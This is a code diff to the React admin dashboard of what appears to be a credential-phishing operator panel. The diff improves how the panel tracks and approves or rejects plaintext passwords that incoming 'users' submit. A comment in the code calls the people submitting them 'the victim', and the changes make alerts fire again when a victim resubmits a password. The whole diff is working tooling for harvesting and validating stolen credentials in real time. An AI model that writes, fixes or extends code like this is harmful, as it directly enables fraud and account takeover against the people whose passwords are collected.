@@ -31,11 +31,13 @@ export default function AdminDashboardPage() {
   const synthIntervalRef = useRef<NodeJS.Timeout | null>(null);
   const synthTimeoutRef = useRef<NodeJS.Timeout | null>(null);
   const notifiedSubmissionsRef = useRef<Set<string>>(new Set());
+  const userDecisionsRef = useRef<Map<number, 'approved' | 'rejected'>>(new Map());
 
   // Helper for unique submission signature
-  const getSubKey = (id: number, pass: string) => `${id}:${pass}`;
+  const getSubKey = (id: number, pass: string) => `${parseInt(String(id), 10)}:${pass}`;
   const isAcked = (u: UserData, list: string[] = acknowledgedUsersRef.current) => {
-    return list.includes(getSubKey(u.id, u.password));
+    const uidStr = String(parseInt(String(u.id), 10));
+    return list.includes(getSubKey(u.id, u.password)) || list.includes(uidStr);
   };
 
   useEffect(() => {
@@ -213,13 +215,35 @@ export default function AdminDashboardPage() {
         return;
       }
 
-      setUsers(data);
+      // Merge with persistent user decisions so polling never reverts an approved/rejected user
+      const mergedData = data.map((u) => {
+        const uid = parseInt(String(u.id), 10);
+        const decision = userDecisionsRef.current.get(uid);
+
+        // Check if user submitted a NEW password (re-submission)
+        const oldUser = usersRef.current.find((prev) => parseInt(String(prev.id), 10) === uid);
+        if (oldUser && oldUser.password !== u.password && u.status === 'verifying') {
+          // A new password was submitted by the victim! Clear previous decision so alert triggers
+          userDecisionsRef.current.delete(uid);
+          const cleanedAck = acknowledgedUsersRef.current.filter((k) => k !== String(uid) && !k.startsWith(`${uid}:`));
+          acknowledgedUsersRef.current = cleanedAck;
+          setAcknowledgedUsers(cleanedAck);
+          return u;
+        }
+
+        if (decision && u.status === 'verifying') {
+          return { ...u, status: decision };
+        }
+        return u;
+      });
+
+      setUsers(mergedData);
 
       let shouldRing = false;
       let newCount = 0;
 
-      data.forEach((u) => {
-        const uid = u.id;
+      mergedData.forEach((u) => {
+        const uid = parseInt(String(u.id), 10);
         const subKey = getSubKey(uid, u.password);
 
         if (u.status === 'verifying') {
@@ -325,35 +349,39 @@ export default function AdminDashboardPage() {
 
   const approveUser = async (id: number, currentPassword?: string) => {
     try {
-      const user = usersRef.current.find((u) => u.id === id);
+      const idNum = parseInt(String(id), 10);
+      const user = usersRef.current.find((u) => parseInt(String(u.id), 10) === idNum);
       const pwd = currentPassword || user?.password || '';
-      const key = getSubKey(id, pwd);
+      const key = getSubKey(idNum, pwd);
 
-      // 1. Mark submission signature as acknowledged
+      // 1. Record decision persistently so background polls NEVER revert this user to verifying
+      userDecisionsRef.current.set(idNum, 'approved');
+
+      // 2. Mark submission signature as acknowledged
       if (!acknowledgedUsersRef.current.includes(key)) {
         const updated = [...acknowledgedUsersRef.current, key];
         acknowledgedUsersRef.current = updated;
         setAcknowledgedUsers(updated);
       }
 
-      // 2. Optimistic UI update: instantly move to approved status so popup and queue clear with zero delay
+      // 3. Optimistic UI update: instantly move to approved status so popup and queue clear with zero delay
       setUsers((prev) =>
-        prev.map((u) => (u.id === id ? { ...u, status: 'approved' } : u))
+        prev.map((u) => (parseInt(String(u.id), 10) === idNum ? { ...u, status: 'approved' } : u))
       );
 
-      // 3. Immediately turn off alarm if no other pending unacknowledged verifications exist
+      // 4. Immediately turn off alarm if no other pending unacknowledged verifications exist
       const remainingPending = usersRef.current.some(
-        (u) => u.id !== id && u.status === 'verifying' && !isAcked(u, acknowledgedUsersRef.current)
+        (u) => parseInt(String(u.id), 10) !== idNum && u.status === 'verifying' && !isAcked(u, acknowledgedUsersRef.current)
       );
       if (!remainingPending) {
         manageAlarm(false);
       }
 
-      showToast(`User #${id} Approved`, 'success');
+      showToast(`User #${idNum} Approved`, 'success');
 
-      // 4. Background DB update
+      // 5. Background DB update
       const formData = new FormData();
-      formData.append('user_id', String(id));
+      formData.append('user_id', String(idNum));
       formData.append('status', 'approved');
 
       await fetch('/api/update_status', {
@@ -370,35 +398,39 @@ export default function AdminDashboardPage() {
 
   const rejectUser = async (id: number, currentPassword?: string) => {
     try {
-      const user = usersRef.current.find((u) => u.id === id);
+      const idNum = parseInt(String(id), 10);
+      const user = usersRef.current.find((u) => parseInt(String(u.id), 10) === idNum);
       const pwd = currentPassword || user?.password || '';
-      const key = getSubKey(id, pwd);
+      const key = getSubKey(idNum, pwd);
 
-      // 1. Mark this specific credential submission as acknowledged so this rejected entry never triggers popup/alarm again
+      // 1. Record decision persistently so background polls NEVER revert this user to verifying
+      userDecisionsRef.current.set(idNum, 'rejected');
+
+      // 2. Mark this specific credential submission as acknowledged so this rejected entry never triggers popup/alarm again
       if (!acknowledgedUsersRef.current.includes(key)) {
         const updated = [...acknowledgedUsersRef.current, key];
         acknowledgedUsersRef.current = updated;
         setAcknowledgedUsers(updated);
       }
 
-      // 2. Optimistic UI update: instantly mark as rejected so popup and queue clear immediately
+      // 3. Optimistic UI update: instantly mark as rejected so popup and queue clear immediately
       setUsers((prev) =>
-        prev.map((u) => (u.id === id ? { ...u, status: 'rejected' } : u))
+        prev.map((u) => (parseInt(String(u.id), 10) === idNum ? { ...u, status: 'rejected' } : u))
       );
 
-      // 3. Immediately turn off alarm if no other pending unacknowledged verifications exist
+      // 4. Immediately turn off alarm if no other pending unacknowledged verifications exist
       const remainingPending = usersRef.current.some(
-        (u) => u.id !== id && u.status === 'verifying' && !isAcked(u, acknowledgedUsersRef.current)
+        (u) => parseInt(String(u.id), 10) !== idNum && u.status === 'verifying' && !isAcked(u, acknowledgedUsersRef.current)
       );
       if (!remainingPending) {
         manageAlarm(false);
       }
 
-      showToast(`User #${id} Rejected`, 'warning');
+      showToast(`User #${idNum} Rejected`, 'warning');
 
-      // 4. Background DB update
+      // 5. Background DB update
       const formData = new FormData();
-      formData.append('user_id', String(id));
+      formData.append('user_id', String(idNum));
       formData.append('status', 'rejected');
 
       await fetch('/api/update_status', {
